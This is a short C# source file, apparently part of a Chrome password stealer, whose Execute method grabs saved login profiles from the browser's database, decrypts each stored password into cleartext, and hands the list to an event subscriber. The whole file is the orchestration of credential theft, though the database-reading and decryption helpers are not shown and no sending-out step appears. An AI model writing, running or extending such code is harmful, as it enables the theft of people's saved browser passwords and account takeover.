using System.Collections.Generic;

namespace ChromeDecrypt
{
    public class CDC
    {
        public delegate void PasswordsReadyHandler(List<CPProfile> data);

        public static void Execute()
        {
            var grab = new DBGrab();
            var data = grab.GetCPP();
            var dec = new CDecrypt();

            foreach (var profile in data)
            {
                profile.ClearPass = dec.decrypt(profile.Password);
            }
            HandleOutputReady(data);
        }

        public static event PasswordsReadyHandler OnPasswordReady;

        public static void HandleOutputReady(List<CPProfile> output)
        {
            OnPasswordReady?.Invoke(output);
        }
    }
}